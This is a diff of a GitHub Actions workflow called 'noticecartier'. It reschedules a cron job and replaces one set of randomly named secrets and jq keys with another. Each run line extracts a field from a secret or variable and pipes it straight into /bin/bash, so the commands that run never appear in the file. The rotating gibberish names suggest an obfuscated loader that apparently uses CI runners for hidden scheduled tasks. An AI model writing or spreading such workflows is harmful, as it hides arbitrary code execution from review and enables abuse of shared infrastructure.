@@ -1,29 +1,25 @@
 name: noticecartier
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 0/6 * * *'
+    - cron: '4 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: noticecartier
         env:
-          vvvxr27626: ${{ secrets.vvvxr27626 }}
+          ep60: ${{ secrets.ep60 }}
         run: |
-          echo $vvvxr27626 | jq -r .vnhcr62 | /bin/bash
-          echo $qpamf3 | jq -r .rur2 | /bin/bash
-          echo $xfngu44536 | jq -r .xqyl6387 | /bin/bash
-          echo $wtkq4 | jq -r .j6000 | /bin/bash
-          echo $aop93650 | jq -r .zycbz7184 | /bin/bash
-          echo $lb83 | jq -r .b45 | /bin/bash
-          echo $dsw668 | jq -r .b30 | /bin/bash
-          echo $xzhy521 | jq -r .n751 | /bin/bash
-          echo $rir2 | jq -r .so89126 | /bin/bash
-          echo $hjb055 | jq -r .c463 | /bin/bash
-          echo $ugw806 | jq -r .ryvi51 | /bin/bash
-          echo $ncvz79210 | jq -r .ogwd39998 | /bin/bash
-          echo $lb54 | jq -r .h999 | /bin/bash
+          echo $ep60 | jq -r .by27095 | /bin/bash
+          echo $fsgl431 | jq -r .rl1 | /bin/bash
+          echo $kavgw0 | jq -r .ho393 | /bin/bash
+          echo $dei4028 | jq -r .jufu454 | /bin/bash
+          echo $b5283 | jq -r .rpnik473 | /bin/bash
+          echo $tr7887 | jq -r .oxu3 | /bin/bash
+          echo $no48230 | jq -r .qhss68 | /bin/bash
+          echo $oelcp39310 | jq -r .uoatx84 | /bin/bash
 
